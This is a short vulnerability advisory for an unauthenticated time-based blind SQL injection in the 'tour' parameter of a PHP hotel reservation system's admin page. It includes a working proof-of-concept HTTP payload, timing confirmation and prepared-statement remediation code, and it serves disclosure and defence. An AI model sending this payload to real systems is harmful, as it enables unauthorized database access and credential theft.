# SQL Injection in Hotel and Tourism Reservation System PHP 1.0 — /admin/tour_reserves.php

## Affected Product Details
- **Product:** Hotel and Tourism Reservation In PHP
- **Version:** 1.0
- **Vendor:** https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
- **Vulnerable File:** `/ht/admin/tour_reserves.php`
- **Vulnerable Parameter:** `tour` (POST)
- **Authentication Required:** No
- **Attack Vector:** Remote
- **Vulnerability Type:** Time-based Blind SQL Injection (CWE-89)
- **CVSS v3.1 Score:** 7.5 (High)
- **CVSS v3.1 Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Proof of Concept

**Vulnerable Request:**
```http
POST /ht/admin/tour_reserves.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

clear=&tour=(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'*/
```

**Time-based Confirmation:**
```
sleep(0)  =>  0.011s
sleep(3)  =>  3.017s
sleep(6)  =>  6.008s
sleep(15) => 15.005s
```

## Impact
An unauthenticated remote attacker can enumerate the entire database, extract credentials and sensitive data, and potentially achieve full system compromise.

## Remediation
```php
$stmt = $conn->prepare("SELECT * FROM tour_reserves WHERE tour=?");
$stmt->bind_param("i", $tour);
$stmt->execute();
```

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
- https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
